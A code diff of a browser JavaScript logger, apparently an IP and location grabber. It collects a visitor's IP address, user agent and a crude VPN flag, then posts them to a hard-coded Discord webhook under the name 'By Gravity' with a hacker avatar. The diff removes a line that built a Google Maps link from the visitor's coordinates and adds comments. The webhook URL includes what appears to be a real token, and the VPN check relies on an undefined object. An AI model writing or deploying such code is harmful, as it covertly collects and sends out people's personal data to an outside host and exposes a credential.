@@ -1,4 +1,4 @@
-const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk';
+const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk'; // Replace with your actual webhook URL
 
 const request = async () => {
   try {
@@ -7,12 +7,12 @@ const request = async () => {
     const ip = ipData.ip;
 
     const userAgent = navigator.userAgent;
+
+    // VPN detection algorithm
     let isVPN = false;
     if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
       isVPN = true;
     }
-    const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
-
     const message = {
       username: 'By Gravity',
       avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
